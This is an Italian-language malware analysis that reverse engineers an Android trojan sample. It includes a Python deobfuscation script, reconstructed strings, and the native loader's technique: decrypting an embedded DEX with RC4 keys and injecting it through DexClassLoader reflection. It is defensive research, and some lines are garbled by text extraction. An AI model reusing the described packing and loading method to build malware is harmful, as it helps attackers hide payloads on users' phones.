#The easy case: there is a block already\nprocessed at va if b[\"start\"] == va:\nreturn b\n#The va address is in the middle of a block\nif va > b[\"start\"] and va <\nb[\"end\"]:\n#va is in this block, stop here without splitting if split is False\n#this is used to stop enumerating the\nistruction in a block earlier than normal (which would be when we found a jump, ret and so on)\nif not split:\nreturn b\n#Make a new block at va\nf = new_block(va)\nf[\"end\"] = b[\"end\"]\nf[\"code\"] = {v:i for v,i in b[\"code\"].items() if v >=\nva }\nf[\"follow\"] = b[\"follow\"]\nf[\"branch\"] = b[\"branch\"]\n#Update the current block\nb[\"code\"] = {v:i for v,i in\nb[\"code\"].items() if v < va }\nb[\"follow\"] = f\nb[\"branch\"] = None\nb[\"end\"] = va\nreturn f\n#The va is not in any block\nreturn None\n#__stack_chk_fail is used to terminate a block on GCC/clang, we consider a call to it a terminating\ncondition\nfail = elf.plt[\"__stack_chk_fail\"]\n#Check if this va is already done before making a new block\nb =\ncheck_done_and_split(va)\nif b:\nreturn b\n#Make a new block\nlisting = new_block(va)\n#Do until the block ends\nwhile\nTrue:\n#Max x86 inst len is 16B, we read 16B and decode the instruction\ncode = elf.read(va, 16)\n#Decode the\ninstruction (this is much slower than mapping the code segment but it works)\ndec = Decoder(64, code, ip=va)\ninst =\nnext(dec, None)\nif inst is None:\nraise ValueError(f\"Cannot decode at VA {va}\")\n#Add the instruction to the code\nlisting[\"code\"][va] = inst\n#Check if this instruction jumps somewhere\ncflow = inst.flow_control\n#call, int and normal\ninstruction don't end the block...\nif cflow in [FlowControl.NEXT, FlowControl.CALL, FlowControl.INDIRECT_CALL,\nFlowControl.INTERRUPT]:\n#... unless is a call to fail\nif cflow == FlowControl.CALL and inst.near_branch_target ==\nfail:\nreturn listing\n#Next va to fetch and decode (also: update \"end\")\nva = va + inst.len\nlisting[\"end\"] = va\n#We\nneed to check if we stepped into a splitted block\nnext_b = check_done_and_split(va, False)\nif next_b:\n#We did, stop\nhere and set that flow as the next one\nlisting[\"follow\"] = b\nreturn listing\ncontinue\n#ret and ud1, ud2 terminate the\nblock\nelif cflow in [FlowControl.RETURN, FlowControl.EXCEPTION]:\nreturn listing\n#jmp\nelif cflow ==\nFlowControl.UNCONDITIONAL_BRANCH:\n#far calls are not used on mainstream OSes\nif inst.op0_kind !=\nOpKind.NEAR_BRANCH64:\nraise ValueError(\"FAR BRANCH not implemented\")\n#Make the follow block at the target VA\nlisting[\"follow\"] = make_block(elf, inst.near_branch_target, blocks_done)\nreturn listing\n#jmp [] we don't track\nvalues so we throw here\nelif cflow == FlowControl.INDIRECT_BRANCH:\nraise ValueError(\"Indirect branch not\nimplemented\")\n#ditto\nelif cflow == FlowControl.XBEGIN_XABORT_XEND:\nraise ValueError(\"RTM not implemented\")\n#jcc\nelif\ncflow == FlowControl.CONDITIONAL_BRANCH:\n#ditto\nif inst.op0_kind != OpKind.NEAR_BRANCH64:\nraise ValueError(\"FAR\nBRANCH not implemented\")\n#Make the blocks for the two branches\nlisting[\"follow\"] = make_block(elf, va + inst.len,\nblocks_done)\nlisting[\"branch\"] = make_block(elf, inst.near_branch_target, blocks_done) return listing\nelse:\nraise\nValueError(\"Unknown flow type\")\n#This is just for debug\ndef print_cfg(b, left=0, done=None):\nif done is None:\ndone =\n[]\nprint(\"\\t\" * left, end=\"\")\nprint(hex(b[\"start\"]))\nif b[\"start\"] in done:\nreturn;\ndone.append(b[\"start\"])\nif\nb[\"follow\"]:\nprint_cfg(b[\"follow\"], left + 1, done)\nif b[\"branch\"]:\nprint_cfg(b[\"branch\"], left + 1, done)\n#Just\ndebug, taken from iced-x86\ndef create_enum_dict(module):\nreturn {module.__dict__[key]:key for key in module.__dict__\nif isinstance(module.__dict__[key], int)}\nREGISTER_TO_STRING = create_enum_dict(Register)\ndef\nregister_to_string(value):\ns = REGISTER_TO_STRING.get(value)\nif s is None:\nreturn str(value) + \" /*Register enum*/\"\nreturn s\ndef print_registers(regs):\nfor r,v in regs.items():\nprint(f\"{register_to_string(r)} = {hex(v)}\")\n#This is an\nhelper that executes a callback for each instruction in a block and successors\ndef for_each_instruction(b, cb,\narg=None):\n#Terminating condition\nif b is None:\nreturn\n#Call the callback\nfor va, i in b[\"code\"].items():\ncb(va, i,\narg)\n#Recursive step\nfor_each_instruction(b[\"follow\"], cb, arg)\nfor_each_instruction(b[\"branch\"], cb, arg)\n\"\"\"\nThis\nmethod finds any call to a memory address (i e indirect call with mem) and resolve the index (from the displacement\n\n```\n\n-----\n\n```\n              ) p p, y\nfunctions to avoid as much as false positives\nas possible\n\"\"\"\ndef find_env_calls(va, i, arg):\nif i.mnemonic ==\nMnemonic.CALL and i.op_kind(0) == OpKind.MEMORY:\ninfo = info_factory.info(i)\nmem = info.used_memory()[0]\nidx =\nmem.displacement // 8\nif idx >= 0 and idx < len(ENV_VTABLE):\narg[va] = ENV_VTABLE[idx]\n#Map SOME register to its 64bit name. This is minimal set of register required to process this sample.\ndef r64(r):\nif r == Register.EDX:\nreturn\nRegister.RDX\nif r == Register.ECX:\nreturn Register.RCX\nif r == Register.ESI:\nreturn Register.RSI\nif r ==\nRegister.EDI:\nreturn Register.RDI\nif r == Register.R8D:\nreturn Register.R8 return r\n#Read r8 data from rsi\ndef\nget_source(elf, regs):\n#r8 = len\n#rsi = start\nreturn elf.read(regs[Register.RSI], regs[Register.R8])\n\"\"\"\nThis\nfunction traces the minimum set of values to recreate the strings\nThe idea is to process: mov reg, reg (and\nvariants), mov reg, imm (and variant) and\nlea reg, xxx.\nThe register are renamed to their full 64-bit name to avoid\nimplementing a merge. This is NOT x86 correct but work in this sample\n\"\"\"\ndef trace_strings(elf, b, strcpy, strcat,\nregs={}):\nstrings = {}\n#Write RSP in the register map\nregs[Register.RSP] = 0\n#For each instruction\nfor va, i in\nb[\"code\"].items():\n#mov reg, reg\nif i.code == Code.MOV_RM64_R64 and i.op_kind(0) == OpKind.REGISTER:\nregs[r64(i.op_register(0))] = regs[r64(i.op_register(1))]\n#mov reg, reg\nelif i.code == Code.MOV_R64_RM64 and\ni.op_kind(1) == OpKind.REGISTER:\nregs[r64(i.op_register(0))] = regs[i.op_register(1)]\n#mov reg, imm\nelif i.code ==\nCode.MOV_R32_IMM32:\nregs[r64(i.op_register(0))] = i.immediate(1)\n#mov reg, imm\nelif i.code == Code.MOV_R64_IMM64:\nregs[r64(i.op_register(0))] = i.immediate(1)\n#mov reg, imm\nelif i.code == Code.MOV_RM64_IMM32 and i.op_kind(0) ==\nOpKind.REGISTER:\nregs[r64(i.op_register(0))] = i.immediate(1) #mov reg, imm\nelif i.code == Code.MOV_RM32_IMM32 and\ni.op_kind(0) == OpKind.REGISTER:\nregs[r64(i.op_register(0))] = i.immediate(1) #lea reg, [rsp + xxx]\nelif i.code ==\nCode.LEA_R64_M and i.memory_base == Register.RSP:\n#This denote the START of a string, we set the register to the VA\nof the instruction and NOT\n#to the memory operand (which we cannot represent as a number anyway) so that we know that\nrdi will\n#hold the va of the instruction that started the string (and to comment) when a call to strcpy or strcat is\ndone\nregs[r64(i.op_register(0))] = va\n#call to strcpy\nelif i.mnemonic == Mnemonic.CALL and i.near_branch_target ==\nstrcpy:\n#Get the data to copy\nsrc = get_source(elf, regs)\n#Set the string\nstrings[regs[Register.RDI]] = src\n#call to\nstrcat\nelif i.mnemonic == Mnemonic.CALL and i.near_branch_target == strcat:\n#Get the data to cat\nsrc =\nget_source(elf, regs)\n#Cancat the data\nstrings[regs[Register.RDI]] += src\n#lea res, [xxx]\nelif i.code ==\nCode.LEA_R64_M and i.memory_base == Register.RIP:\n#iced-x86 computer RIP-relative addresses <3\nregs[r64(i.op_register(0))] = i.memory_displacement\nreturn strings\n\"\"\"\nMain code\n\"\"\"\ncalls = {}\n#Load the lib\nelf_lib\n= ELF(\"libuXTAbVUl.so\")\n#For each java or C++ function\nfor f, va in elf_lib.symbols.items():\nif\n(f.startswith(\"Java_\") or f.startswith(\"_Z\")) and f != \"_Znam\":\n#Get the CFG\nb = make_block(elf_lib, va)\n#Find the\nJNIEnv calls\nfor_each_instruction(b, find_env_calls, calls)\n#Rebuild the strings\ns = trace_strings(elf_lib, b,\nelf_lib.plt[\"__strncpy_chk2\"], elf_lib.plt[\"__strncat_chk\"])\n#Print the IDC instructions to comment the IDA db (for\nthe strings)\nfor sea, sv in s.items():\n#We assume no real unicode char is used and we simply drop zero bytes\nsv =\nsv.replace(b\"\\x00\", b\"\").decode()\nprint(f\"set_cmt({hex(sea)}, \\\"{sv}\\\", 1);\")\n#Print the IDC for the JNIcalls\nfor ea,\ncmt in calls.items():\nprint(f\"set_cmt({hex(ea)}, \\\"{cmt}\\\", 1);\")\n\n#### Lo script è strutturato in tre parti:\n\n 1. make_block è una funzione che a partire da un VA in un ELF costruisce un CFG rappresentato da un grafo di dizionari collegati. I\n blocchi sono usati per l’analisi del codice macchina. 2. trace_strings è la funzione che ricostruisce le stringhe. L’idea su cui si basa è semplice: ogni stringa inizia con una chiamata a\n __strncpy_chk2 e l’indirizzo a cui scriverla è calcolato con un’istruzione del tipo lea r64, [rsp+displacement]. I caratteri sono poi aggiunti tramite __strncat_chk uno alla volta. Questa funzione quindi implementa un’esecuzione simbolica e concreta minimale per supportare quella manciata di tipi di istruzioni generati dal meccanismo di offuscazione (maggiori dettagli sono riportati nei commenti del codice). 3. find_env_calls è la funzione che risolve i nome delle chiamate JNIEnv.\n\n Il risultato ottenuto eseguito il codice python è lo script IDC mostrato sotto.\nset_cmt(0xb608, \"getAssets\", 1);\nset_cmt(0xb6f0, \"()Landroid/content/res/AssetManager;\", 1);\nset_cmt(0xba53, \"open\",\n1);\nset_cmt(0xbaba, \"(Ljava/lang/String;)Ljava/io/InputStream;\", 1);\nset_cmt(0xbeb1, \"available\", 1);\nset_cmt(0xbf8e,\n\"()I\", 1);\nset_cmt(0xbfed, \"read\", 1);\nset_cmt(0xc058, \"([B)I\", 1);\nset_cmt(0x8d07, \"getExternalCacheDir\", 1);\nset_cmt(0x8eee, \"()Ljava/io/File;\", 1);\nset_cmt(0x9079, \"java/io/File\", 1);\nset_cmt(0x91a0, \"getPath\", 1);\nset_cmt(0x9254, \"()Ljava/lang/String;\", 1);\nset_cmt(0x944b, \"getApplicationInfo\", 1);\nset_cmt(0x9605, \"\n()Landroid/content/pm/ApplicationInfo;\", 1);\nset_cmt(0x99a3, \"android/content/pm/ApplicationInfo\", 1);\nset_cmt(0x9cdc, \"dataDir\", 1);\nset_cmt(0x9d91, \"Ljava/lang/String;\", 1);\nset_cmt(0x1b33,\n\"EFAXVStkcDXNGbc3odLA5hHsC6osT5SE\", 1);\nset_cmt(0x1e53, \"com.leadendq:raw/tgvfowooof\", 1);\nset_cmt(0x20ed,\n\"tgvfowooof\", 1);\nset_cmt(0x21d4, \"getResources\", 1);\nset_cmt(0x2310, \"()Landroid/content/res/Resources;\", 1);\nset_cmt(0x262c, \"getIdentifier\", 1);\nset_cmt(0x2769, \"(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I\", 1);\nset_cmt(0x2cd5, \"openRawResource\", 1);\nset_cmt(0x2e52, \"(I)Ljava/io/InputStream;\", 1);\nset_cmt(0x30b7, \"available\",\n1);\nset_cmt(0x3194, \"()I\", 1);\nset_cmt(0x31ec, \"read\", 1);\nset_cmt(0x3253, \"([B)I\", 1);\nset_cmt(0x32cf,\n\"java/lang/Class\", 1);\nset_cmt(0x344d, \"forName\", 1);\nset_cmt(0x3506, \"(Ljava/lang/String;)Ljava/lang/Class;\", 1);\nset_cmt(0x3895, \"android.app.ActivityThread\", 1);\nset_cmt(0x3b2f, \"android/app/ActivityThread\", 1);\nset_cmt(0x3db3,\n\"currentActivityThread\", 1);\nset_cmt(0x3fbc, \"()Landroid/app/ActivityThread;\", 1);\nset_cmt(0x4299,\n\"getDeclaredField\", 1);\nset_cmt(0x441b, \"(Ljava/lang/String;)Ljava/lang/reflect/Field;\", 1);\nset_cmt(0x4872,\n\"mPackages\", 1);\nset_cmt(0x4961, \"setAccessible\", 1);\nset_cmt(0x4a9c, \"(Z)V\", 1);\nset_cmt(0x4b11, \"get\", 1);\nset_cmt(0x4b66, \"(Ljava/lang/Object;)Ljava/lang/Object;\", 1);\nset_cmt(0x4f22, \"getPackageName\", 1);\nset_cmt(0x5070, \"\n()Ljava/lang/String;\", 1);\nset_cmt(0x5265, \"get\", 1);\nset_cmt(0x52b2, \"(Ljava/lang/Object;)Ljava/lang/Object;\", 1);\nset_cmt(0x5672, \"get\", 1);\nset_cmt(0x56bf, \"()Ljava/lang/Object;\", 1);\nset_cmt(0x58b9, \"android.app.LoadedApk\", 1);\nset_cmt(0x5ac7, \"getDeclaredField\", 1);\nset_cmt(0x5c51, \"(Ljava/lang/String;)Ljava/lang/reflect/Field;\", 1);\nset cmt(0x60a8 \"mClassLoader\" 1); set cmt(0x61d7 \"setAccessible\" 1); set cmt(0x6310 \"(Z)V\" 1); set cmt(0x6385\n\n```\n\n-----\n\n```\n g, ); (, ( j g j ;) j g j ;, ); (,\n\"dalvik/system/DexClassLoader\", 1);\nset_cmt(0x6a4b, \"<init>\", 1);\nset_cmt(0x6ae7, \"\n(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V\", 1);\nset_cmt(0x7292, \"set\", 1);\nset_cmt(0x72e3, \"(Ljava/lang/Object;Ljava/lang/Object;)V\", 1);\nset_cmt(0xa0bc, \"getExternalCacheDir\", 1);\nset_cmt(0xa2a3, \"()Ljava/io/File;\", 1);\nset_cmt(0xa42b, \"java/io/File\", 1);\nset_cmt(0xa54b, \"getPath\", 1);\nset_cmt(0xa602, \"()Ljava/lang/String;\", 1);\nset_cmt(0xa7f5, \"getApplicationInfo\", 1);\nset_cmt(0xa9b3, \"\n()Landroid/content/pm/ApplicationInfo;\", 1);\nset_cmt(0xad5b, \"android/content/pm/ApplicationInfo\", 1);\nset_cmt(0xb09f, \"dataDir\", 1);\nset_cmt(0xb14f, \"Ljava/lang/String;\", 1);\nset_cmt(0xb30c, \"cache/\", 1);\nset_cmt(0x80ce, \"android/app/ActivityThread\", 1);\nset_cmt(0x8353, \"currentActivityThread\", 1);\nset_cmt(0x8565, \"\n()Landroid/app/ActivityThread;\", 1);\nset_cmt(0x884a, \"getApplication\", 1);\nset_cmt(0x89a9, \"\n()Landroid/app/Application;\", 1);\nset_cmt(0x7d64, \"CallObjectMethodV\", 1);\nset_cmt(0xc0e7, \"GetObjectClass\", 1);\nset_cmt(0xc101, \"GetMethodID\", 1);\nset_cmt(0xc110, \"ExceptionCheck\", 1);\nset_cmt(0xc13d, \"GetObjectClass\", 1);\nset_cmt(0xc156, \"GetMethodID\", 1);\nset_cmt(0xc16a, \"NewStringUTF\", 1);\nset_cmt(0xc18c, \"ExceptionCheck\", 1);\nset_cmt(0xc1a3, \"GetObjectClass\", 1);\nset_cmt(0xc1bc, \"GetMethodID\", 1);\nset_cmt(0xc1db, \"NewByteArray\", 1);\nset_cmt(0xc1ed, \"GetObjectClass\", 1);\nset_cmt(0xc206, \"GetMethodID\", 1);\nset_cmt(0xc261, \"GetArrayLength\", 1);\nset_cmt(0xc286, \"GetByteArrayRegion\", 1);\nset_cmt(0x9f69, \"GetObjectClass\", 1);\nset_cmt(0x9fb9, \"FindClass\", 1);\nset_cmt(0x9fd5, \"GetMethodID\", 1);\nset_cmt(0xa020, \"FindClass\", 1);\nset_cmt(0xa036, \"GetFieldID\", 1);\nset_cmt(0xa048,\n\"GetObjectField\", 1);\nset_cmt(0x76a3, \"NewStringUTF\", 1);\nset_cmt(0x76e5, \"GetObjectClass\", 1);\nset_cmt(0x7705,\n\"GetMethodID\", 1);\nset_cmt(0x7729, \"GetObjectClass\", 1);\nset_cmt(0x774c, \"GetMethodID\", 1);\nset_cmt(0x7763,\n\"NewStringUTF\", 1);\nset_cmt(0x779f, \"GetMethodID\", 1);\nset_cmt(0x77c5, \"GetObjectClass\", 1);\nset_cmt(0x77e5,\n\"GetMethodID\", 1);\nset_cmt(0x7804, \"NewByteArray\", 1);\nset_cmt(0x7821, \"GetMethodID\", 1);\nset_cmt(0x7844,\n\"GetArrayLength\", 1);\nset_cmt(0x789d, \"FindClass\", 1);\nset_cmt(0x78bc, \"GetStaticMethodID\", 1);\nset_cmt(0x78d3,\n\"NewStringUTF\", 1);\nset_cmt(0x7902, \"GetObjectClass\", 1);\nset_cmt(0x7919, \"FindClass\", 1);\nset_cmt(0x7938,\n\"GetStaticMethodID\", 1);\nset_cmt(0x796a, \"GetMethodID\", 1);\nset_cmt(0x7979, \"ExceptionCheck\", 1);\nset_cmt(0x799e,\n\"NewStringUTF\", 1);\nset_cmt(0x79c6, \"GetObjectClass\", 1);\nset_cmt(0x79e5, \"GetMethodID\", 1);\nset_cmt(0x7a16,\n\"GetMethodID\", 1);\nset_cmt(0x7a40, \"GetObjectClass\", 1);\nset_cmt(0x7a5f, \"GetMethodID\", 1);\nset_cmt(0x7a83,\n\"GetObjectClass\", 1);\nset_cmt(0x7aa0, \"GetMethodID\", 1);\nset_cmt(0x7ac6, \"GetObjectClass\", 1);\nset_cmt(0x7ae3,\n\"GetMethodID\", 1);\nset_cmt(0x7b11, \"NewStringUTF\", 1);\nset_cmt(0x7b3b, \"GetObjectClass\", 1);\nset_cmt(0x7b5b,\n\"GetMethodID\", 1);\nset_cmt(0x7b70, \"NewStringUTF\", 1);\nset_cmt(0x7b96, \"GetObjectClass\", 1);\nset_cmt(0x7bb6,\n\"GetMethodID\", 1);\nset_cmt(0x7be8, \"GetMethodID\", 1);\nset_cmt(0x7c13, \"FindClass\", 1);\nset_cmt(0x7c30, \"GetMethodID\",\n1);\nset_cmt(0x7c47, \"NewStringUTF\", 1);\nset_cmt(0x7c85, \"GetMethodID\", 1);\nset_cmt(0xc2b4, \"GetStringUTFChars\", 1);\nset_cmt(0x7e24, \"CallIntMethodV\", 1);\nset_cmt(0x8064, \"NewObjectV\", 1);\nset_cmt(0xb3ca, \"GetObjectClass\", 1);\nset_cmt(0xb422, \"FindClass\", 1);\nset_cmt(0xb43f, \"GetMethodID\", 1);\nset_cmt(0xb4dd, \"GetStringUTFChars\", 1);\nset_cmt(0xb57c, \"NewStringUTF\", 1);\nset_cmt(0xb592, \"ReleaseStringUTFChars\", 1);\nset_cmt(0xb497, \"FindClass\", 1);\nset_cmt(0xb4b4, \"GetFieldID\", 1);\nset_cmt(0xb4c7, \"GetObjectField\", 1);\nset_cmt(0x7fa4, \"CallVoidMethodV\", 1);\nset_cmt(0x7ee4, \"CallStaticObjectMethodV\", 1);\nset_cmt(0x8c4a, \"FindClass\", 1);\nset_cmt(0x8c62, \"GetStaticMethodID\"\n\n#### Una volta eseguito su IDA otteniamo degli utili commenti per l’analisi.\n\n I metodi di classi Java sono chiamati dal codice nativo tramite tre passaggi:\n\n 1. Una chiamata al metodo GetObjectClass di JNIEnv per ottenere un oggetto jclass nel quale ricercare il metodo di interesse; 2. Una chiamata a GetMethodID di JNIEnv per ottenere un oggetto jmethodID che rappresenta il metodo trovato;\n\n```\n\n-----\n\n#### 3 etodo è c a ato t a te etodo Ca Object et od o u suo appe (co e è caso d questo sa p e c e è sc tto C, linguaggio per il quale JNI mette a disposizione tipi appositi).\n\n Un esempio di questi tre passaggi è mostrato sotto, dove il codice recupera un’istanza della classe Resources. Non ci siamo soffermati sui parametri di queste funzioni, in particolare sul fatto che, per via dell’overloading delle funzioni, è necessaria indicare la firma del metodo voluto e quindi molte stringhe saranno firme di metodi.\n\n Mostrare il codice di ogni funzione della libreria nativa sarebbe troppo prolisso quindi ci limitiamo a fornire il database IDA annotato e a riassumere quanto fatto da questa:\n\n 1. Il file DEX finale viene scritto in due possibili percorsi. O dentro la directory dei dati dell’applicazione o dentro la directory, sull’SD\n esterno, assegnata all’applicatione. In entrambi i casi, alla directory scelta è aggiunto il percorso /cache/tgvfowooof. In questo sample è usata la directory interna dell’App. 2. Viene usato openRawResources per aprire la risorsa com.leadendq:raw/tgvfowooof (che contiene il DEX cifrato) e leggerlo in un array di\n byte. 3. L’array viene decifrato tramite RC4 (sotto è mostrato il codice standard per l’inizializzazione della chiave) con la chiave\n EFAXVStkcDXNGbc3odLA5hHsC6osT5SE. 4. Il file è scritto su disco e viene aggiunto al thread un ClassLoader con percorso di ricerca indicato nel primo punto.\n\n\n-----\n\n#### Inizializzazione della chiave secondo RC4 Il file DEX può quindi essere prelevato dalle risorse, ad esempio con apktool -d o simili, e decifrato, per comodità, anche con cyberchef.\n\n## Preparazione al reverse – jrename\n\n#### Ottenuto il DEX è possibile analizzarlo con JADX, gran parte del bytecode viene decompilato egregiamente.\n\n\n-----\n\n#### e a agg o pa te de cas o de e c ass, de etod e de ca p so o o uscat, co e o t deco p ato a c e J ca b a o pe renderli leggibili ma ovviamente sono nomi non significativi. Per gli APK con un gran numero di funzionalità non è possibile memorizzare le funzionalità di ogni nome ma è necessario rinominare i metodi, i campi e le classi.\n\n JADX, che è sia un decompilatore che una sorta di IDE per la navigazione del codice decompilato, permette di rinominare le entità ed è quindi usabile per il compito successivo dell’analisi, ovvero il reverse engineering vero e proprio.\n\n Per prima cosa è stato convertito il file DEX in un JAR, in questo caso usando enjarify:\n```\n$ enjarify.sh coper.dex -o coper.jar\n\n```\n\n#### Le classi dentro il JAR hanno come nomi parole chiave riservate:\n```\n$ 7z l coper.jar\n7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28\np7zip Version 17.04\n(locale=en_GB.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs x64)\nScanning the drive for archives:\n1 file, 272962 bytes\n(267 KiB)\nListing archive: coper.jar\n-Path = coper.jar\nType = zip\nPhysical Size = 272962\nDate Time Attr Size\nCompressed Name\n------------------- ----- ------------ ------------ -----------------------1980-01-01 00:00:00\n..... 222 222 com/leadendq/p012q.class\n1980-01-01 00:00:00 ..... 463 463 com/leadendq/p015a.class\n1980-01-01 00:00:00\n..... 2029 2029 com/leadendq/p016q.class\n1980-01-01 00:00:00 ..... 785 785 com/leadendq/p020e$fddo.class\n1980-01-01\n00:00:00 ..... 3551 3551 com/leadendq/p020e.class\n1980-01-01 00:00:00 ..... 2190 2190 com/leadendq/p022e.class\n198001-01 00:00:00 ..... 4164 4164 com/leadendq/p025n.class\n1980-01-01 00:00:00 ..... 3329 3329 com/leadendq/p025p.class\n1980-01-01 00:00:00 ..... 857 857 com/leadendq/p027j.class\n1980-01-01 00:00:00 ..... 222 222 com/leadendq/p028m.class\n1980-01-01 00:00:00 ..... 244 244 com/leadendq/p032o.class\n1980-01-01 00:00:00 ..... 240 240 com/leadendq/p036z.class\n1980-01-01 00:00:00 ..... 2916 2916 com/leadendq/p038x.class\n1980-01-01 00:00:00 ..... 459 459\ncom/leadendq/p041o.class\n1980-01-01 00:00:00 ..... 244 244 com/leadendq/p043c.class\n1980-01-01 00:00:00 ..... 244 244\ncom/leadendq/p049d.class\n1980-01-01 00:00:00 ..... 222 222 com/leadendq/p055u.class\n1980-01-01 00:00:00 ..... 1687\n1687 com/leadendq/p057h.class\n1980-01-01 00:00:00 ..... 244 244 com/leadendq/p058q.class\n1980-01-01 00:00:00 .....\n137 137 com/leadendq/p058z.class\n1980-01-01 00:00:00 ..... 137 137 com/leadendq/p059z.class\n1980-01-01 00:00:00 .....\n244 244 com/leadendq/p061e.class\n1980-01-01 00:00:00 ..... 2268 2268 com/leadendq/p061p.class\n1980-01-01 00:00:00\n..... 2965 2965 com/leadendq/p064y.class\n1980-01-01 00:00:00 ..... 137 137 com/leadendq/p077n.class\n1980-01-01\n00:00:00 ..... 755 755 com/leadendq/p080g$fddo.class\n1980-01-01 00:00:00 ..... 888 888 com/leadendq/p080g$ifdf.class\n1980-01-01 00:00:00 ..... 2879 2879 com/leadendq/p080g.class\n1980-01-01 00:00:00 ..... 141 141\ncom/leadendq/p081h$fddo.class\n1980-01-01 00:00:00 ..... 139 139 com/leadendq/p081h$ifdf.class\n1980-01-01 00:00:00\n..... 13713 6215 com/leadendq/p081h.class\n1980-01-01 00:00:00 ..... 461 461 com/leadendq/p084n$fddo.class\n1980-01-01\n00:00:00 ..... 571 571 com/leadendq/p084n$ifdf.class\n1980-01-01 00:00:00 ..... 4490 4490 com/leadendq/p084n.class\n1980-01-01 00:00:00 ..... 1562 1562 com/leadendq/p086c.class\n1980-01-01 00:00:00 ..... 222 222\ncom/leadendq/p092f.class\n1980-01-01 00:00:00 ..... 2459 2459 com/leadendq/p094v.class\n1980-01-01 00:00:00 ..... 763\n763 com/leadendq/p095g$fddo.class\n1980-01-01 00:00:00 ..... 15805 8079 com/leadendq/p095g.class\n1980-01-01 00:00:00\n..... 75 75 com/leadendq/p097d$fddo.class\n1980-01-01 00:00:00 ..... 459 459 com/leadendq/p097d$for.class\n1980-01-01\n00:00:00 ..... 1489 1489 com/leadendq/p097d$ifdf.class\n1980-01-01 00:00:00 ..... 1831 1831\ncom/leadendq/p097d$new.class\n1980-01-01 00:00:00 ..... 7299 7299 com/leadendq/p097d.class\n1980-01-01 00:00:00 .....\n1245 1245 fddo/break.class\n1980-01-01 00:00:00 ..... 1697 1697 fddo/catch$fddo.class\n1980-01-01 00:00:00 ..... 4219\n4219 fddo/catch.class\n1980-01-01 00:00:00 ..... 4577 4577 fddo/class.class\n1980-01-01 00:00:00 ..... 566 566\nfddo/const$fddo.class\n1980-01-01 00:00:00 ..... 935 935 fddo/const$for.class\n1980-01-01 00:00:00 ..... 844 844\nfddo/const$ifdf.class\n1980-01-01 00:00:00 ..... 573 573 fddo/const$new.class\n1980-01-01 00:00:00 ..... 841 841\nfddo/const$try.class\n1980-01-01 00:00:00 ..... 20911 10101 fddo/const.class\n1980-01-01 00:00:00 ..... 9667 9667\nfddo/fddo.class\n1980-01-01 00:00:00 ..... 2681 2681 fddo/final.class\n1980-01-01 00:00:00 ..... 329127 92046\nfddo/for.class\n1980-01-01 00:00:00 ..... 558 558 fddo/goto$fddo.class\n1980-01-01 00:00:00 ..... 32946 15998\nfddo/goto.class\n1980-01-01 00:00:00 ..... 6940 6940 fddo/ifdf.class\n1980-01-01 00:00:00 ..... 2536 2536\nfddo/new.class\n1980-01-01 00:00:00 ..... 16671 8240 fddo/super.class\n1980-01-01 00:00:00 ..... 362 362\nfddo/this$fddo.class\n1980-01-01 00:00:00 ..... 546 546 fddo/this$ifdf$fddo.class\n1980-01-01 00:00:00 ..... 981 981\nfddo/this$ifdf.class\n1980-01-01 00:00:00 ..... 21834 10298 fddo/this.class\n1980-01-01 00:00:00 ..... 4037 4037\nfddo/throw.class\n1980-01-01 00:00:00 ..... 3720 3720 fddo/try.class\n1980-01-01 00:00:00 ..... 304 304\nfddo/while.class\n1980-01-01 00:00:00 ..... 4088 4088 fddo/case.class\n1980-01-01 00:00:00 ..... 10975 4803\nfddo/else.class\n------------------- ----- ------------ ------------ -----------------------1980-01-01 00:00:00\n570582 264380 71 files\n\n Inoltre, i metodi ed i campi delle classi hanno nomi che sono riutilizzati varie volte. Possiamo ora rinominare e decompilare il file JAR:\n$ ./jrename coper.jar\n$ jadx -d res1 coper_renamed.jar\n\n```\n\n#### Otteniamo così un file jar (coper_renamed.jar) e dei sorgenti su cui possiamo lavorare.\n\n### Preparazione al reversing: decifrare le stringhe\n\n#### Il renaming ha permesso di ottenere codice con nomi univoci (e a codice prefisso) per ogni entità ed è quindi facile rinominare classi e metodi via via che si procede al reversing.\n\n Dando un’occhiata al codice però possiamo osservare spezzoni tipo questo:\n\n\n-----\n\n```\n  g ( p p, p g, ); ( pp,\n\"perms_check_delay\", 600);\nif (Class67a.method247a(applicationContext, Class45a.method67a(\"47e69dd09da9d2c046\"),\n\"\").equals(\"perms\")) {\nClass67a.method248a(applicationContext, Class45a.method67a(\"47e69dd09da9d2c046\"), \"\");\n}\n\n#### I metodi hanno nomi sequenziali ma si notano chiamate a Class45a.method67a con stringhe esadecimali. Questo ci spinge a pensare che probabilmente si tratta di una funzione di decifratura delle stringhe. La classe Class45a si presenta così:\npackage fddo;\npublic class Class45a {\nprivate int[] field62a;\nprivate int field63a = 0;\nprivate int field64a = 0;\npublic Class45a(byte[] bArr) {\nthis.field62a = method65a(bArr);\n}\nprivate int[] method65a(byte[] bArr) {\nint[] iArr =\nnew int[256];\nfor (int i = 0; i < 256; i++) {\niArr[i] = i;\n}\nint i2 = 0;\nfor (int i3 = 0; i3 < 256; i3++) {\ni2 =\n(((i2 + iArr[i3]) + bArr[i3 % bArr.length]) + 256) % 256;\nmethod66a(i3, i2, iArr);\n}\nreturn iArr;\n}\nprivate void\nmethod66a(int i, int i2, int[] iArr) {\nint i3 = iArr[i];\niArr[i] = iArr[i2];\niArr[i2] = i3;\n}\npublic static String\nmethod67a(String str) {\nreturn new Class45a(\"FqCpR3UIB7Eelm7akFJ\".getBytes()).method69a(str);\n}\npublic static String\nmethod68a(String str) {\nreturn str;\n}\npublic String method69a(String str) {\nreturn method70a(method71a(str));\n}\npublic String method70a(byte[] bArr) {\nbyte[] bArr2 = new byte[bArr.length];\nfor (int i = 0; i < bArr.length; i++) {\nint i2 = (this.field64a + 1) % 256;\nthis.field64a = i2;\nint i3 = this.field63a;\nint[] iArr = this.field62a;\nint i4 =\n(i3 + iArr[i2]) % 256;\nthis.field63a = i4;\nmethod66a(i2, i4, iArr);\nint[] iArr2 = this.field62a;\nbArr2[i] = (byte)\n(iArr2[(iArr2[this.field64a] + iArr2[this.field63a]) % 256] ^ bArr[i]);\n}\nreturn new String(bArr2);\n}\npublic byte[]\nmethod71a(String str) {\nint length = str.length();\nbyte[] bArr = new byte[(length / 2)];\nfor (int i = 0; i < length;\ni += 2) {\nbArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + 